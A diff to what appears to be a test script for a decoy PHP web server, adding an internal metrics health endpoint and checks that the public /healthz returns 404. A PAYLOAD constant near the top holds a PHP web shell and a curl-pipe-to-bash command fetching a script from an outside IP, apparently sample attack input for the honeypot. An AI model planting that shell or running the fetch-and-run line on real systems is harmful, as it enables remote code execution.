@@ -31,6 +31,7 @@ from pathlib import Path
 ROOT = Path(__file__).resolve().parents[1]
 HOST = "127.0.0.1"
 PORT = 18081
+METRICS_PORT = 18099
 PAYLOAD = b"<?php system($_GET['c']); ?>\ncurl -s http://203.0.113.9/x.sh | bash\n"
 
 
@@ -78,6 +79,20 @@ def http_request(
     return result
 
 
+def internal_healthz(timeout: float = 10.0) -> tuple[int, dict[str, str], bytes]:
+    connection = http.client.HTTPConnection(HOST, METRICS_PORT, timeout=timeout)
+    connection.request("GET", "/healthz")
+    response = connection.getresponse()
+    payload = response.read()
+    result = (
+        response.status,
+        {name.lower(): value for name, value in response.getheaders()},
+        payload,
+    )
+    connection.close()
+    return result
+
+
 def wait_ready(port: int = PORT, timeout: float = 20.0) -> None:
     deadline = time.time() + timeout
     while time.time() < deadline:
@@ -105,7 +120,7 @@ def build_env(tmp: Path, **overrides: object) -> dict[str, str]:
             "PHPTOPWN_MAX_ARTIFACT_BYTES": "1048576",
             "PHPTOPWN_MAX_ARTIFACT_PARTS": "8",
             "PHPTOPWN_LOG_LEVEL": "INFO",
-            "PHPTOPWN_METRICS_PORT": "18099",
+            "PHPTOPWN_METRICS_PORT": str(METRICS_PORT),
         }
     )
     env.update({key: str(value) for key, value in overrides.items()})
@@ -172,7 +187,11 @@ def run_checks(tmp: Path, env: dict[str, str]) -> None:
     check("POST" in headers.get("allow", ""), "OPTIONS missing Allow methods")
 
     status, _, body = http_request("GET", "/healthz")
-    check(status == 200 and b'"ok"' in body, "health endpoint failed")
+    check(status == 404, f"decoy /healthz should 404 like Apache, got {status}")
+
+    status, _, body = internal_healthz()
+    check(status == 200 and b'"status":"ok"' in body, "internal health endpoint failed")
+    check(b"uptime_seconds" in body and b"counters" in body, "health payload missing counters")
 
     status, _, _ = http_request(
         "POST",
@@ -426,6 +445,7 @@ def run_tls_check(tmp: Path) -> None:
         tmp / "tls",
         PHPTOPWN_HTTP_PORT=plain_port,
         PHPTOPWN_TLS_PORT=tls_port,
+        PHPTOPWN_METRICS_PORT=str(METRICS_PORT + 3),
         PHPTOPWN_TLS="true",
         PHPTOPWN_CERT_FILE=str(cert_file),
         PHPTOPWN_KEY_FILE=str(key_file),
